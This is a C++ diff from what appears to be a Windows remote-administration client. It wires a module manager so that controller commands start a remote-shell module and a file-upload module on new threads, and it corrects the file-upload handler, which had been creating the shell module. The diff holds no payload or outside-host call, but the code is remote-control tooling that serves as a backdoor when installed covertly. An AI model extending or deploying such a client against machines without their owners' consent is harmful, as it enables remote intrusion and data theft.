@@ -4,6 +4,7 @@
 #include "SocketClient.h"
 #include "SocketClientManage.h"
 #include "ModuleShellRemote.h"
+#include "ModuleFileUpload.h"
 
 
 
@@ -35,11 +36,10 @@ void CModule::OnRecvivePacket(CPacket* pPacket) {
 
 
 CModuleManage::CModuleManage(CSocketClient* pMainSocketClient) {
-	m_pMainSocketClient = pMainSocketClient;
+	m_pSocketClient = pMainSocketClient;
 
-	memset(m_ahThread, 0, sizeof(m_ahThread));
-	m_dwThreadNum = 0;
-
+	//memset(m_ahThread, 0, sizeof(m_ahThread));
+	//m_dwThreadNum = 0;
 }
 
 
@@ -55,11 +55,11 @@ BOOL CModuleManage::OnReceiveConnectPacket(CPacket* pPacket) {
 	switch (pPacket->m_PacketHead.wCommandId) {
 
 	case SHELL_CONNECT:
-		m_ahThread[m_dwThreadNum++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleShellRemote, (LPVOID)pPacketCopy, 0, NULL);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleShellRemote, (LPVOID)pPacketCopy, 0, NULL);
 		break;
 
 	case FILE_UPLOAD_CONNECT:
-		m_ahThread[m_dwThreadNum++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleFileUpload, (LPVOID)pPacketCopy, 0, NULL);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleFileUpload, (LPVOID)pPacketCopy, 0, NULL);
 		break;
 
 	default:
@@ -110,7 +110,7 @@ DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
 
 DWORD WINAPI RunModuleFileUpload(CPacket* pPacket) {
 	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
-	CModuleShellRemote* pModule = new CModuleShellRemote(pChildSocketClient);			// 在这里面给pChildSocketClient->m_pModule赋值
+	CModuleFileUpload* pModule = new CModuleFileUpload(pChildSocketClient);			// 在这里面给pChildSocketClient->m_pModule赋值
 
 	pChildSocketClient->StartSocketClient();
 	pChildSocketClient->SendPacket(FILE_UPLOAD_CONNECT, NULL, 0);
